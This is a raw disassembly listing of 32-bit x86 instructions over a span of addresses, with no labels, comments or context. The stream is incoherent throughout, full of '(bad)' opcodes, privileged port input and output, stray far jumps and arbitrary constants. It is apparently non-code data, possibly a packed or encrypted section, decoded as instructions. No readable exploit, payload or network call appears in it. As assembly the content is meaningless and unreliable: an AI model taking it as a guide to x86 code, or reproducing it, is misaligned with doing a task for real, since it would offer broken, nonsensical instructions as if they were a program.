  41b458:	ss gs scas eax,DWORD PTR es:[edi]
  41b45b:	xor    BYTE PTR [eax+0x7597a1a7],bl
  41b461:	shl    DWORD PTR [edi+0xa],0xfc
  41b465:	cmp    DWORD PTR [edi+0x47],ebx
  41b468:	lods   al,BYTE PTR ds:[esi]
  41b469:	out    0x6,al
  41b46b:	push   es
  41b46c:	dec    eax
  41b46d:	test   al,0x90
  41b46f:	mov    dh,0x3b
  41b471:	xor    BYTE PTR [ebx-0x196780ed],ch
  41b477:	push   ecx
  41b478:	mov    eax,0x3fa176
  41b47d:	add    DWORD PTR [eax-0x36cba76e],0x75b826a1
  41b487:	adc    BYTE PTR [edi+0x41eda103],ah
  41b48d:	dec    edx
  41b48e:	cmp    al,0x3
  41b490:	dec    ebp
  41b491:	xchg   ebp,eax
  41b492:	lods   eax,DWORD PTR ds:[esi]
  41b493:	stos   BYTE PTR es:[edi],al
  41b494:	sahf   
  41b495:	ds mov eax,0x76b515cf
  41b49b:	push   0xb4ef2403
  41b4a0:	push   eax
  41b4a1:	mov    edi,0x610b72b3
  41b4a6:	mov    bh,0x62
  41b4a8:	out    dx,eax
  41b4a9:	mov    edx,0x20080f15
  41b4ae:	pop    esp
  41b4af:	dec    esi
  41b4b0:	and    bl,dh
  41b4b2:	cmp    BYTE PTR [esp+ecx*2],bl
  41b4b5:	push   cs
  41b4b6:	sbb    al,0x4
  41b4b8:	inc    edi
  41b4b9:	pop    ds
  41b4ba:	xchg   DWORD PTR [esi+0x50],edx
  41b4bd:	call   0x947c4ddd
  41b4c2:	jo     0x41b447
  41b4c4:	pop    ebx
  41b4c5:	js     0x41b456
  41b4c7:	jl     0x41b474
  41b4c9:	stos   BYTE PTR es:[edi],al
  41b4ca:	dec    ebp
  41b4cb:	popa   
  41b4cc:	and    DWORD PTR [eax+0x7da66f17],edx
  41b4d2:	or     bh,BYTE PTR [edi]
  41b4d4:	das    
  41b4d5:	imul   DWORD PTR [ebx-0x4d5597a7]
  41b4db:	push   edi
  41b4dc:	ret    0xb23b
  41b4df:	dec    cl
  41b4e1:	dec    edi
  41b4e2:	and    BYTE PTR [edi+0xc03b8f1],cl
  41b4e8:	pop    esp
  41b4e9:	adc    eax,DWORD PTR [edi]
  41b4eb:	(bad)  
  41b4ec:	(bad)  
  41b4ed:	loop   0x41b4df
  41b4ef:	jbe    0x41b4c8
  41b4f1:	(bad)  
  41b4f3:	adc    DWORD PTR [ebx+0x3b],esi
  41b4f6:	mov    ecx,0x9232ef07
  41b4fb:	fidiv  WORD PTR [eax-0x4438e23c]
  41b501:	dec    edi
  41b502:	push   0xbbeca407
  41b507:	push   ebx
  41b508:	in     al,dx
  41b509:	cmp    BYTE PTR cs:[esi-0x4ab4410a],dh
  41b510:	or     ebp,DWORD PTR [edi+eiz*8+0x4e]
  41b514:	mov    BYTE PTR [ecx],0xb9
  41b517:	cli    
  41b518:	out    0xc2,al
  41b51a:	aad    0x36
  41b51c:	jno    0x41b510
  41b51e:	push   ebp
  41b51f:	xor    cl,BYTE PTR [edi-0x53]
  41b522:	jmp    0xd267:0x71c4bc33
  41b529:	xlat   BYTE PTR ds:[ebx]
  41b52a:	mov    dl,0x35
  41b52c:	inc    ecx
  41b52d:	(bad)  
  41b52e:	div    DWORD PTR [edx+eiz*1-0x1a]
  41b532:	add    DWORD PTR [ebp+0x4343dd02],ebx
  41b538:	or     BYTE PTR [ebx],bh
  41b53a:	xchg   edx,eax
  41b53b:	push   es
  41b53c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b53d:	(bad)  
  41b53e:	loope  0x41b546
  41b540:	popa   
  41b541:	inc    eax
  41b542:	sub    DWORD PTR [edi-0x6c82280a],edi
  41b548:	fiadd  WORD PTR [ebp+0x6a]
  41b54b:	jmp    0x41b56a
  41b54d:	xchg   ah,dh
  41b54f:	fnsave [ebx-0x36]
  41b552:	(bad)  
  41b553:	fistp  WORD PTR [edi]
  41b555:	mov    eax,DWORD PTR [ebx-0x12f9eef8]
  41b55b:	xchg   esp,eax
  41b55c:	fyl2xp1 
  41b55e:	push   eax
  41b55f:	inc    ebp
  41b560:	data16 jle 0x41b5d5
  41b563:	or     ebp,esp
  41b565:	in     al,dx
  41b566:	aaa    
  41b567:	mov    ecx,0x1db1e2a4
  41b56c:	(bad)  
  41b56d:	ins    BYTE PTR es:[edi],dx
  41b56e:	pop    ds
  41b56f:	test   esp,0x41ce2255
  41b575:	adc    eax,0x5afdc841
  41b57a:	ret    0xc12d
  41b57d:	cmp    DWORD PTR [ebx-0x23],eax
  41b580:	ja     0x41b526
  41b582:	jl     0x41b557
  41b584:	mov    eax,0x6a12142b
  41b589:	mov    edx,0x868cdc78
  41b58e:	xor    eax,0x2f4b2fa5
  41b593:	imul   edi,DWORD PTR [ebx+eiz*4],0xb9f2d5f7
  41b59a:	mov    edx,0x2f6c72fe
  41b59f:	int3   
  41b5a0:	mov    ah,0x5c
  41b5a2:	inc    ebx
  41b5a3:	mov    al,ds:0xbced4b3c
  41b5a8:	pop    ds
  41b5a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5aa:	data16 mov ah,ah
  41b5ad:	push   esp
  41b5ae:	adc    eax,0x4fbbed2d
  41b5b3:	mov    cs,ebp
  41b5b5:	adc    BYTE PTR [ebp-0x77b9e3ba],dh
  41b5bb:	cmp    ecx,eax
  41b5bd:	sub    DWORD PTR [esi+edi*1-0xe],ecx
  41b5c1:	mov    ecx,0x659aa032
  41b5c6:	cwde   
  41b5c7:	lahf   
  41b5c8:	fucomip st,st(0)
  41b5ca:	jl     0x41b54e
  41b5cc:	and    ch,BYTE PTR [eax+0x13]
  41b5cf:	or     DWORD PTR [ebx],ebp
  41b5d1:	shl    edi,0x54
  41b5d4:	pop    ss
  41b5d5:	and    al,0x58
  41b5d7:	outs   dx,BYTE PTR ds:[esi]
  41b5d8:	sbb    BYTE PTR [eax+0x47f8f62f],0x4a
  41b5df:	and    al,0x15
  41b5e1:	pop    eax
  41b5e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5e3:	xchg   ecx,eax
  41b5e4:	fs pop edi
  41b5e6:	push   es
  41b5e7:	int3   
  41b5e8:	out    0x31,eax
  41b5ea:	imul   edi,DWORD PTR [esi+eiz*2-0x7c],0x5f670d53
  41b5f2:	mov    ch,0x1e
  41b5f4:	and    DWORD PTR [ebx-0x40],0x9813f16c
  41b5fb:	sbb    eax,0x6eab4d94
  41b600:	inc    esp
  41b601:	fst    DWORD PTR [edi+ecx*2+0x78]
  41b605:	pop    ebp
  41b606:	xchg   ebp,eax
  41b607:	enter  0xa698,0x90
  41b60b:	sbb    BYTE PTR [edi-0x1f1462b4],cl
  41b611:	and    dl,BYTE PTR [edi]
  41b613:	adc    eax,0x59ed8729
  41b618:	cdq    
  41b619:	or     DWORD PTR [eax+0x48],eax
  41b61c:	fldenv [ebx-0x2c]
  41b61f:	and    bh,cl
  41b621:	lahf   
  41b622:	cmp    DWORD PTR [edx+0x13],esi
  41b625:	ret    0xdf14
  41b628:	icebp  
  41b629:	mov    al,0x34
  41b62b:	inc    edi
  41b62c:	cmp    BYTE PTR [ebx+edx*1+0x4fa9f850],ch
  41b633:	dec    eax
  41b634:	xchg   ecx,esp
  41b636:	lahf   
  41b637:	jnp    0x41b5db
  41b639:	mov    BYTE PTR es:[eax+0x2f348149],bl
  41b640:	push   ebx
  41b641:	mov    dh,0x81
  41b643:	dec    ebp
  41b644:	mov    al,ds:0x88eb0867
  41b649:	inc    eax
  41b64a:	adc    al,0xbf
  41b64c:	inc    eax
  41b64d:	xchg   esi,eax
  41b64e:	jbe    0x41b616
  41b650:	jno    0x41b6a2
  41b652:	pop    esi
  41b653:	inc    ebp
  41b654:	mov    BYTE PTR [ebp-0x7d66def0],al
  41b65a:	dec    eax
  41b65b:	jmp    0xf1329ef5
  41b660:	mov    al,0x28
  41b662:	mov    ebp,edx
  41b664:	mov    eax,ds:0x71d2fbd3
  41b669:	mov    ds:0xc7be0d00,al
  41b66e:	push   ecx
  41b66f:	adc    esi,edi
  41b671:	and    BYTE PTR [edi],ch
  41b673:	stos   DWORD PTR es:[edi],eax
  41b674:	xchg   edi,eax
  41b675:	dec    ecx
  41b676:	xchg   ecx,eax
  41b677:	jmp    0x49f4e621
  41b67c:	imul   esp,DWORD PTR [esi-0x40],0x1d8ceed9
  41b683:	fsub   QWORD PTR [edi+0x41]
  41b686:	out    dx,al
  41b687:	addr16 mov al,ds:0xe920
  41b68b:	sbb    ch,0x8d
  41b68e:	xchg   ebp,eax
  41b68f:	pop    edx
  41b690:	dec    eax
  41b691:	imul   edx,DWORD PTR [esi],0x4d
  41b694:	enter  0x908d,0x2a
  41b698:	dec    ecx
  41b699:	imul   ebx,esp,0x997cb11a
  41b69f:	ds xchg edi,eax
  41b6a1:	sbb    esi,DWORD PTR [esi+0x7e48d87]
  41b6a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6a8:	bound  esi,QWORD PTR [edx]
  41b6aa:	ins    DWORD PTR es:[edi],dx
  41b6ab:	jge    0x41b681
  41b6ad:	sub    BYTE PTR [edx],ah
  41b6af:	inc    edi
  41b6b0:	hlt    
  41b6b1:	adc    esp,DWORD PTR [edx+0x401cd9a8]
  41b6b7:	xor    al,0x89
  41b6b9:	push   edx
  41b6ba:	sub    DWORD PTR [ecx+0x1cf61425],ecx
  41b6c0:	(bad)  
  41b6c1:	fucomp st(0)
  41b6c3:	push   ebx
  41b6c4:	dec    edx
  41b6c5:	hlt    
  41b6c6:	xchg   esp,eax
  41b6c7:	arpl   WORD PTR [edi+0x2a],dx
  41b6ca:	mov    al,ds:0xbaac0996
  41b6cf:	jl     0x41b6ba
  41b6d1:	sub    esp,DWORD PTR [eax-0x7d]
  41b6d4:	fst    DWORD PTR [bx-0x1d]
  41b6d8:	cmp    cl,bl
  41b6da:	and    al,cl
  41b6dc:	cmp    BYTE PTR [eax+0x17],al
  41b6df:	mov    dl,0x8a
  41b6e1:	inc    edi
  41b6e2:	cld    
  41b6e3:	(bad)  
  41b6e4:	pop    esp
  41b6e5:	push   esp
  41b6e6:	xor    ah,BYTE PTR [ebx-0x214d77b]
  41b6ec:	test   BYTE PTR [eax],0xac
  41b6ef:	pop    edi
  41b6f0:	test   DWORD PTR [ebp+0x39bd072a],0xef0b1130
  41b6fa:	sbb    eax,0x1a62eb2d
  41b6ff:	push   0xffffff94
  41b701:	jnp    0x41b740
  41b703:	mov    cl,0x59
  41b705:	sbb    BYTE PTR ds:0x1714b4cd,0xe7
  41b70c:	call   0x95448f7c
  41b711:	mov    eax,ds:0x4ccac7d0
  41b716:	mov    BYTE PTR ds:0x7d7ab8f8,bh
  41b71c:	mov    al,ds:0x64118ebd
  41b721:	rcl    ah,0xc4
  41b724:	mov    al,0x80
  41b726:	pop    ecx
  41b727:	sub    BYTE PTR [ebx],cl
  41b729:	pop    ecx
  41b72a:	retf   
  41b72b:	adc    BYTE PTR [ebp+0x8],ah
  41b72e:	aas    
  41b72f:	sub    eax,0x6e9d7173
  41b734:	pop    ebx
  41b735:	sbb    eax,0x910192e5
  41b73a:	cmp    eax,0x619c3b86
  41b73f:	jl     0x41b731
  41b741:	outs   dx,BYTE PTR ds:[esi]
  41b742:	mov    cl,0x9a
  41b744:	dec    esp
  41b745:	mov    al,0x56
  41b747:	sub    al,0x4d
  41b749:	call   0xafa9:0x38a76be
  41b750:	dec    esi
  41b751:	in     al,0x61
  41b753:	and    BYTE PTR [esi-0x1d163a4c],cl
  41b759:	mov    eax,ebp
  41b75b:	xor    al,0xb9
  41b75d:	inc    edi
  41b75e:	or     edi,DWORD PTR [eax-0x50e3ac9d]
  41b764:	push   ecx
  41b765:	mov    ebx,DWORD PTR [edx]
  41b767:	cmp    esi,0x21
  41b76a:	outs   dx,BYTE PTR ds:[esi]
  41b76b:	sbb    dl,BYTE PTR [eax+0x26]
  41b76e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b76f:	jo     0x41b6fb
  41b771:	mov    ds:0xca6b36bd,eax
  41b776:	test   al,0x66
  41b778:	dec    edx
  41b779:	sub    bh,BYTE PTR [ecx+0x886faf0]
  41b77f:	popa   
  41b780:	pop    esp
  41b781:	ins    BYTE PTR es:[edi],dx
  41b782:	retf   
  41b783:	ret    0x4afb
  41b786:	ret    
  41b787:	jecxz  0x41b800
  41b789:	xchg   esi,eax
  41b78a:	retf   0xb52b
  41b78d:	outs   dx,DWORD PTR ds:[esi]
  41b78e:	cmp    eax,0x92bca68d
  41b793:	pop    esi
  41b794:	sub    eax,0xc0159c07
  41b799:	mov    ah,0x72
  41b79b:	lahf   
  41b79c:	jmp    DWORD PTR [edx-0x7f62facb]
  41b7a2:	pop    es
  41b7a3:	dec    eax
  41b7a4:	in     al,dx
  41b7a5:	jl     0x41b78a
  41b7a7:	and    cl,ah
  41b7a9:	mov    gs,WORD PTR [ebp+0x3a464b0e]
  41b7af:	xor    eax,0xc5a3a0cb
  41b7b4:	out    dx,al
  41b7b5:	dec    edx
  41b7b6:	pop    ecx
  41b7b7:	mov    edi,0xdd0bdd6e
  41b7bc:	or     eax,0x19e2ec88
  41b7c1:	jb     0x41b7a8
  41b7c3:	scas   eax,DWORD PTR es:[edi]
  41b7c4:	cmp    eax,0x5609f15e
  41b7c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7ca:	cmp    dh,BYTE PTR [edi+0x75374970]
  41b7d0:	retf   
  41b7d1:	int    0xf0
  41b7d3:	jmp    0x3cd2:0xa8e175e4
  41b7da:	mov    es,WORD PTR [edi]
  41b7dc:	iret   
  41b7dd:	adc    eax,0x7102f60f
  41b7e2:	outs   dx,DWORD PTR ds:[esi]
  41b7e3:	sbb    BYTE PTR [edx-0x24],cl
  41b7e6:	ins    DWORD PTR es:[edi],dx
  41b7e7:	sub    al,0x46
  41b7e9:	add    eax,0xa77975bb
  41b7ee:	loope  0x41b7e0
  41b7f0:	js     0x41b850
  41b7f2:	fwait
  41b7f3:	test   ch,0x23
  41b7f6:	mov    bh,0x96
  41b7f8:	ror    DWORD PTR [ebx-0x2db6aed4],0x8d
  41b7ff:	retf   0xebc6
  41b802:	lahf   
  41b803:	jo     0x41b7d4
  41b805:	stc    
  41b806:	pop    ss
  41b807:	shl    DWORD PTR [esi-0x1147c234],1
  41b80d:	sub    edx,esi
  41b80f:	push   ebx
  41b810:	jno    0x41b820
  41b812:	nop
  41b813:	dec    ebp
  41b814:	dec    ebp
  41b815:	ins    DWORD PTR es:[edi],dx
  41b816:	mov    ebx,0x8dc9fc0a
  41b81b:	popa   
  41b81c:	inc    edx
  41b81d:	and    al,0x7d
  41b81f:	inc    eax
  41b820:	stos   BYTE PTR es:[edi],al
  41b821:	add    BYTE PTR [ebp+0x15930449],cl
  41b827:	pop    es
  41b828:	push   esi
  41b829:	(bad)  
  41b82a:	jg     0x41b7e8
  41b82c:	fidivr DWORD PTR [ebp-0x4181c0aa]
  41b832:	mov    al,0x45
  41b834:	sti    
  41b835:	push   ecx
  41b836:	and    dh,BYTE PTR [ebp+0x20]
  41b839:	lds    edx,FWORD PTR [ebp+eax*1+0x4316ed3e]
  41b840:	adc    al,0x1a
  41b842:	push   edi
  41b843:	sub    al,0x52
  41b845:	sub    eax,0x2545ce84
  41b84a:	jle    0x41b84f
  41b84c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b84d:	jae    0x41b8ca
  41b84f:	aam    0x60
  41b851:	iret   
  41b852:	adc    ecx,DWORD PTR [edi-0x74]
  41b855:	xor    DWORD PTR [edi+0x46],edi
  41b858:	int    0x31
  41b85a:	arpl   WORD PTR [edx+edi*1-0x1a],si
  41b85e:	stos   DWORD PTR es:[edi],eax
  41b85f:	out    0xd7,eax
  41b861:	push   ebp
  41b862:	ret    
  41b863:	and    eax,0x604c267
  41b868:	jo     0x41b8ad
  41b86a:	fisttp WORD PTR es:[ebx+ecx*2-0x3d]
  41b86f:	cwde   
  41b870:	xchg   BYTE PTR [edx],dl
  41b872:	jne    0x41b883
  41b874:	bnd jg 0x41b897
  41b877:	xchg   esi,eax
  41b878:	fstp   DWORD PTR [esi-0x4c00456c]
  41b87e:	mov    ah,0xdd
  41b880:	cld    
  41b881:	rcl    ebp,cl
  41b883:	test   eax,0xcf265e96
  41b888:	and    esi,edx
  41b88a:	hlt    
  41b88b:	xchg   ebx,eax
  41b88c:	xlat   BYTE PTR ds:[ebx]
  41b88d:	jl     0x41b8a2
  41b88f:	mov    cl,0x8e
  41b891:	sahf   
  41b892:	pop    ecx
  41b893:	xor    eax,0x66ebe7a1
  41b898:	icebp  
  41b899:	mov    cl,0x70
  41b89b:	(bad)  
  41b89c:	xchg   edi,eax
  41b89d:	stos   BYTE PTR es:[edi],al
  41b89e:	dec    eax
  41b89f:	push   esp
  41b8a0:	jge    0x41b864
  41b8a2:	out    0xa8,al
  41b8a4:	loopne 0x41b8bf
  41b8a6:	jne    0x41b91f
  41b8a8:	jp     0x41b885
  41b8aa:	outs   dx,BYTE PTR ds:[esi]
  41b8ab:	xor    al,0x89
  41b8ad:	mov    esi,DWORD PTR [edx]
  41b8af:	xchg   esi,eax
  41b8b0:	lea    ebx,[ebx-0x782f61e0]
  41b8b6:	mov    dh,0x36
  41b8b8:	lahf   
  41b8b9:	bound  ebp,QWORD PTR [edx+0x0]
  41b8bc:	mov    ss,ecx
  41b8be:	push   ecx
  41b8bf:	inc    ecx
  41b8c0:	mov    al,ds:0xe180be03
  41b8c5:	std    
  41b8c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8c7:	test   eax,0x1788613a
  41b8cc:	enter  0x422d,0xb8
  41b8d0:	loopne 0x41b8c4
  41b8d2:	cmp    esp,esp
  41b8d4:	push   0x35
  41b8d6:	ror    eax,0x30
  41b8d9:	and    ebx,DWORD PTR [ebx+0x7a2a9b6d]
  41b8df:	pop    ebp
  41b8e0:	ss (bad) 
  41b8e2:	jmp    0x71df:0xd2733d2c
  41b8e9:	(bad)  
  41b8ea:	div    DWORD PTR [eax+0x20]
  41b8ed:	jns    0x41b8b5
  41b8ef:	sbb    ebx,DWORD PTR [ebp+0xf53bffa]
  41b8f5:	mov    dl,0x3d
  41b8f7:	call   ecx
  41b8f9:	sub    dl,BYTE PTR [edi-0x5d22ec2a]
  41b8ff:	jns    0x41b975
  41b901:	sub    ch,al
  41b903:	arpl   WORD PTR ds:0x914313e7,dx
  41b909:	repz sub bl,al
  41b90c:	sub    DWORD PTR [eax-0x77],ebp
  41b90f:	jmp    0x13d:0xd654241c
  41b916:	cmp    bl,dl
  41b918:	iret   
  41b919:	adc    BYTE PTR ds:0xb5d6987b,ch
  41b91f:	cmp    DWORD PTR [eax],edi
  41b921:	or     BYTE PTR [ebp*2-0x3d526e6c],ch
  41b928:	pop    esi
  41b929:	jle    0x41b931
  41b92b:	sbb    ecx,DWORD PTR [ebx]
  41b92d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b92e:	dec    ecx
  41b92f:	mov    edi,0x384e2cd8
  41b934:	xchg   esi,eax
  41b935:	dec    ebx
  41b936:	fs add al,0x8f
  41b939:	rcl    DWORD PTR [ecx],1
  41b93b:	push   0x45
  41b93d:	aas    
  41b93e:	stc    
  41b93f:	aad    0xec
  41b941:	push   edi
  41b942:	xlat   BYTE PTR ds:[ebx]
  41b943:	inc    esi
  41b944:	jmp    0x7dc40807
  41b949:	xor    ah,ah
  41b94b:	rol    esi,cl
  41b94d:	pop    esp
  41b94e:	push   es
  41b94f:	jo     0x41b948
  41b951:	lahf   
  41b952:	les    eax,FWORD PTR ds:0x4805fdeb
  41b958:	cmp    ecx,0x6b
  41b95b:	and    ecx,eax
  41b95d:	mov    ebx,0x644280b4
  41b962:	stc    
  41b963:	(bad)  
  41b964:	and    ecx,esi
  41b966:	stos   DWORD PTR es:[edi],eax
  41b967:	sti    
  41b968:	sbb    DWORD PTR [eax-0x2b],ebp
  41b96b:	scas   eax,DWORD PTR es:[edi]
  41b96c:	or     dh,BYTE PTR [ebx+0x6ff886d2]
  41b972:	mov    edx,0x4fb22760
  41b977:	(bad)  
  41b978:	ins    BYTE PTR es:[edi],dx
  41b979:	and    dl,BYTE PTR [edi-0x25bf6ee2]
  41b97f:	daa    
  41b980:	pop    eax
  41b981:	mov    eax,ds:0xba4ebf9e
  41b986:	mov    ah,0xc5
  41b988:	xor    BYTE PTR [ebp-0x68],cl
  41b98b:	add    eax,DWORD PTR [eax+0x4b]
  41b98e:	dec    ecx
  41b98f:	call   0x4feb46e2
  41b994:	mov    esi,0xa7df9906
  41b999:	lds    ebx,FWORD PTR ds:0x6413c625
  41b99f:	adc    al,0xa2
  41b9a1:	sbb    al,0x58
  41b9a3:	cmp    al,0x9f
  41b9a5:	pusha  
  41b9a6:	adc    BYTE PTR [edx],0x46
  41b9a9:	and    esi,DWORD PTR [esi]
  41b9ab:	push   cs
  41b9ac:	cmp    BYTE PTR [ebx],bh
  41b9ae:	enter  0xddf,0x40
  41b9b2:	xor    al,0xe2
  41b9b4:	lea    edx,[ebx-0x2d]
  41b9b7:	or     BYTE PTR [edx-0x26],cl
  41b9ba:	popa   
  41b9bb:	imul   esp,eax,0xd349af11
  41b9c1:	push   esi
  41b9c2:	mov    ecx,0xa8b34f2b
  41b9c7:	das    
  41b9c8:	in     al,dx
  41b9c9:	repz (bad) 
  41b9cb:	out    0x36,eax
  41b9cd:	pop    ebp
  41b9ce:	sbb    eax,0xd6806282
  41b9d3:	mov    dl,0x6d
  41b9d5:	xchg   edx,eax
  41b9d6:	mov    DWORD PTR [ebx-0x44a9c682],esp
  41b9dc:	bound  esp,QWORD PTR ds:0x1d8ba9b9
  41b9e2:	(bad)  
  41b9e5:	loopne 0x41b982
  41b9e7:	add    esp,DWORD PTR [eax+eiz*2]
  41b9ea:	jle    0x41b9bd
  41b9ec:	scas   al,BYTE PTR es:[edi]
  41b9ed:	(bad)  
  41b9ef:	nop
  41b9f0:	lods   eax,DWORD PTR ds:[esi]
  41b9f1:	aam    0xda
  41b9f3:	or     esi,DWORD PTR [edi-0x6d]
  41b9f6:	imul   esi,DWORD PTR [ebp-0x19],0x72
  41b9fa:	aas    
  41b9fb:	fisttp WORD PTR [edx+0x7f]
  41b9fe:	dec    edx
  41b9ff:	sti    
  41ba00:	ret    0x58da
  41ba03:	xlat   BYTE PTR ds:[ebx]
  41ba04:	test   al,0xed
  41ba06:	sub    cl,dl
  41ba08:	test   eax,0xab732dd1
  41ba0d:	push   ds
  41ba0e:	cmp    ch,0x3b
  41ba11:	gs inc esp
  41ba13:	mov    bl,0xc5
  41ba15:	mov    ?,WORD PTR [eax]
  41ba17:	fdiv   QWORD PTR [ecx]
  41ba19:	ja     0x41b9d1
  41ba1b:	push   0xe0595062
  41ba20:	add    cl,BYTE PTR ds:0x81c73e5a
  41ba26:	xlat   BYTE PTR ds:[ebx]
  41ba27:	jge    0x41b9e1
  41ba29:	call   0x517c:0x1627c464
  41ba30:	inc    edx
  41ba31:	sbb    esi,ebx
  41ba33:	jle    0x41ba55
  41ba35:	mov    eax,DWORD PTR [edi]
  41ba37:	push   ebp
  41ba38:	dec    edi
  41ba39:	fidivr DWORD PTR [ebx-0x41]
  41ba3c:	or     esi,DWORD PTR ds:0x2af9ed86
  41ba42:	fsub   DWORD PTR [ebx]
  41ba44:	stos   DWORD PTR es:[edi],eax
  41ba45:	mov    ds:0x794d01fb,al
  41ba4a:	mov    dh,0xa0
  41ba4c:	push   ss
  41ba4d:	inc    edx
  41ba4e:	icebp  
  41ba4f:	ins    BYTE PTR es:[edi],dx
  41ba50:	xchg   ebx,eax
  41ba51:	fbld   TBYTE PTR [ecx-0x45280a96]
  41ba57:	push   ecx
  41ba58:	lahf   
  41ba59:	js     0x41ba6b
  41ba5b:	je     0x41ba6b
  41ba5d:	stc    
  41ba5e:	xchg   edi,eax
  41ba5f:	imul   edi,DWORD PTR [edx+edx*2+0x449862f0],0xffffffb7
  41ba67:	sub    al,0xf9
  41ba69:	xor    DWORD PTR [edi],0x2fa8e72e
  41ba6f:	inc    esi
  41ba70:	fistp  QWORD PTR [edx+eiz*1+0x2d7a7304]
  41ba77:	pop    es
  41ba78:	xchg   ebx,eax
  41ba79:	add    BYTE PTR [esp+edx*2+0x41],bl
  41ba7d:	adc    eax,0xc1353f08
  41ba82:	call   FWORD PTR [ebp+ebx*1-0xf]
  41ba86:	inc    esi
  41ba87:	xchg   esp,eax
  41ba88:	push   ebp
  41ba89:	xchg   BYTE PTR [edi+0x5d12fa69],ch
  41ba8f:	jno    0x41ba2f
  41ba91:	mov    BYTE PTR [ebx+0x33],bh
  41ba94:	test   al,0x18
  41ba96:	stos   BYTE PTR es:[edi],al
  41ba97:	dec    BYTE PTR [esi-0x77]
  41ba9a:	fimul  DWORD PTR [eax+0x68]
  41ba9d:	out    0xc2,eax
  41ba9f:	and    BYTE PTR ss:[eax+0x5718227],bh
  41baa6:	fcmovnu st,st(3)
  41baa8:	adc    DWORD PTR [ebx-0x2a],esi
  41baab:	shr    DWORD PTR [ebp+0x17],cl
  41baae:	push   es
  41baaf:	pop    esp
  41bab0:	scas   al,BYTE PTR es:[edi]
  41bab1:	sbb    BYTE PTR [edi+ecx*4],dh
  41bab4:	dec    esi
  41bab5:	mov    esi,0xec8dbf2e
  41baba:	push   ss
  41babb:	jp     0x41ba88
  41babd:	mov    eax,0xc244ba68
  41bac2:	cmp    dl,ah
  41bac4:	or     esp,edx
  41bac6:	stc    
  41bac7:	push   edx
  41bac8:	pop    edx
  41bac9:	xchg   ecx,eax
  41baca:	daa    
  41bacb:	mov    ch,0xb6
  41bacd:	test   al,0x39
  41bacf:	shl    BYTE PTR [edx-0x4754e34b],0xac
  41bad6:	push   ebx
  41bad7:	sub    esi,DWORD PTR [eax+ecx*8+0x11]
  41badb:	fnstcw WORD PTR [edi+0x6c492015]
  41bae1:	fdivrp st(5),st
  41bae3:	lahf   
  41bae4:	stc    
  41bae5:	sahf   
  41bae6:	adc    edx,DWORD PTR [ecx-0x228bc1d6]
  41baec:	xcrypt-ctr (bad)
  41baed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41baee:	pop    esi
  41baef:	adc    BYTE PTR [ecx+eiz*2],ah
  41baf2:	xlat   BYTE PTR ds:[ebx]
  41baf3:	push   0xa793d9b3
  41baf8:	repnz xchg edi,eax
  41bafa:	or     eax,0x177bd76b
  41baff:	mov    BYTE PTR [ebx+0x7805dd88],ah
  41bb05:	xlat   BYTE PTR ds:[ebx]
  41bb06:	loope  0x41bb0f
  41bb08:	push   ss
  41bb09:	mov    edx,0x47b03547
  41bb0e:	lods   eax,DWORD PTR ds:[esi]
  41bb0f:	mov    eax,ds:0x1ff2f728
  41bb14:	dec    esp
  41bb15:	ins    DWORD PTR es:[edi],dx
  41bb16:	mov    BYTE PTR [ecx+ebp*8+0x35],0x8d
  41bb1b:	hlt    
  41bb1c:	scas   al,BYTE PTR es:[edi]
  41bb1d:	xchg   ecx,eax
  41bb1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb1f:	outs   dx,DWORD PTR ds:[esi]
  41bb20:	pop    ds
  41bb21:	call   0x8617505b
  41bb26:	sbb    al,0x65
  41bb28:	push   edx
  41bb29:	and    al,0x6e
  41bb2b:	sub    DWORD PTR [edi+0x2c],esp
  41bb2e:	mov    esp,0xe2ba2a59
  41bb33:	sahf   
  41bb34:	sbb    ch,BYTE PTR [edi-0x38]
  41bb37:	shl    BYTE PTR ds:0x7f1de5a3,1
  41bb3d:	push   0x903807da
  41bb42:	add    bh,BYTE PTR [esi]
  41bb44:	or     eax,0xea19158a
  41bb49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb4a:	sub    esi,ecx
  41bb4c:	pop    es
  41bb4d:	imul   edx,DWORD PTR [esi+eiz*1+0x75],0x5
  41bb52:	aam    0xae
  41bb54:	pop    ecx
  41bb55:	mov    ebx,0x668d8d9a
  41bb5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb5b:	push   ecx
  41bb5c:	pop    ds
  41bb5d:	sbb    al,0xb0
  41bb5f:	jecxz  0x41bb9f
  41bb61:	pop    ebx
  41bb62:	(bad)  
  41bb63:	mov    edi,0xd7e498b
  41bb68:	outs   dx,BYTE PTR ds:[esi]
  41bb69:	inc    eax
  41bb6a:	pop    ss
  41bb6b:	sbb    eax,0xbe6f2848
  41bb70:	jecxz  0x41bbcc
  41bb72:	mov    dh,dh
  41bb74:	leave  
  41bb75:	test   eax,0x9459903
  41bb7a:	mov    ebp,0xf4f40131
  41bb7f:	ret    0x446c
  41bb82:	mov    ds:0x899123ae,eax
  41bb87:	xchg   esi,eax
  41bb88:	mov    ds:0x61fd26b2,al
  41bb8d:	mov    edx,0xe2751215
  41bb92:	cli    
  41bb93:	(bad)  
  41bb94:	rcr    DWORD PTR [ecx],1
  41bb96:	mov    eax,0x7b2bb613
  41bb9b:	sbb    al,0x54
  41bb9d:	ins    BYTE PTR es:[edi],dx
  41bb9e:	call   0x3eaa2b8b
  41bba3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bba4:	xor    BYTE PTR ds:0xa76e8d33,dh
  41bbaa:	arpl   WORD PTR [ebx+0x76],bx
  41bbad:	retf   0x4430
  41bbb0:	sub    BYTE PTR [ebx-0x22],al
  41bbb3:	lock fisttp WORD PTR [esi]
  41bbb6:	hlt    
  41bbb7:	mov    ecx,0x914f2ecb
  41bbbc:	sbb    BYTE PTR [eax-0x79],bh
  41bbbf:	mov    dh,0x39
  41bbc1:	shl    BYTE PTR [ecx],cl
